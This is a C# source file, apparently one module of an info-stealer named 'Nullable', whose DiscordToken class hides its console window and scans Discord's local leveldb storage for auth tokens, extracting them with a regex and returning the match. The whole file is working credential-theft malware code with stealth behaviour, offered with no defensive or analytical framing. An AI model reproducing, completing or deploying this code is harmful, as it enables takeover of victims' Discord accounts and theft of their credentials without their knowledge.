using Nullable.Modules.Manager;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Nullable.Modules.Stealer
{
    internal sealed class DiscordToken
    {
        static int SW_HIDE = 0;
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        public static string Grab()
        {
            string Send = "No Token Found!";

            IntPtr myWindow = GetConsoleWindow();
            ShowWindow(myWindow, SW_HIDE);
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb";
            Regex regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");

            string[] dbfiles = Directory.GetFiles(path, "*.ldb", SearchOption.AllDirectories);

            if (Directory.Exists(path))
            {
                foreach (var file in dbfiles)
                {
                    FileInfo info = new FileInfo(file);
                    string contents = File.ReadAllText(info.FullName);
                    Match match = regex.Match(contents);
                    if (match.Success)
                    {
                        Send = match.Value;

                    }
                }
            }
            else
            {
                Send = "User Doesnt Have Discord";
                Logger.Log("Discord: User Doesnt Have Discord!");
            }

            return Send;
        }
    }
}
